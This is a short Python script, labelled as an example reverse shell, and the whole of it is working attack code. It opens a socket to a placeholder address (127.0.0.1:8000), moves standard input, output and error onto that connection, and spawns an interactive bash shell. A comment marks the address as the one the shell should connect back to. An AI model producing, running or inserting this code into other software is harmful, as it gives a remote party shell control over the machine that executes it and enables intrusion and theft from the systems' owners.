# Example of python reverse shell
import pty
import socket,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Address and port to which reverse shell should connect
s.connect(("127.0.0.1",8000))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")